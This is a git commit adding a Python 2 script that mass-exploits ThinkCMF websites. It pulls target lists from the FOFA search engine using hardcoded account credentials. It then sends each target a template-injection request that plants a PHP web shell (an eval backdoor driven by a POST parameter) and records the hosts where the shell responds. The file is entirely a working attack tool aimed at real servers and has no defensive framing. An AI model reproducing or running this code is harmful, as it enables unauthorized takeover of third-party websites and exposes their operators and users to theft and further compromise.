7b96757e7a70181364723c81d5fee22fd99b7991
qiya07 <lushangxiaoye@gmail.com>
2019-11-04 09:38:23 +0800

    Create thinkcmf fofa批量exp.py

---
+++ chinkcmf/thinkcmf fofa批量exp.py
@@ -0,0 +1,37 @@
+# -*- coding: utf-8 -*-
+import fofa
+import requests
+from requests import exceptions
+
+if __name__ == "__main__":
+    email, key = ('744083645@qq.com','d96ed56cdc4c344d8f2418ca7fcb169e')
+    client = fofa.Client(email, key)
+    query_str = 'app="thinkcmf"'
+    with open('results.txt','w') as f:
+        for i in range(100):
+            data = client.get_data(query_str,page=i)
+            print data['results']
+            for site in data['results']:
+                if site.startswith('https'):
+                    site = site
+                else:
+                    site = 'http://' + site
+                #print site
+
+                payload = "/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('error.php','<?php @eval($_P1OST[\"cmd\"]);?>')</php>"
+                exp = site + payload
+                poc = site + '/error.php'
+                try:
+                    r1 = requests.session().get(exp,timeout=3)
+                except Exception,e:
+                    e
+                try:
+                    r2 = requests.session().get(poc,timeout=3)
+                    if r2.status_code == 200:
+                        f.write(site + '/error.php')
+                        print site
+                except Exception,e:
+                    e
+
+
+    f.close()
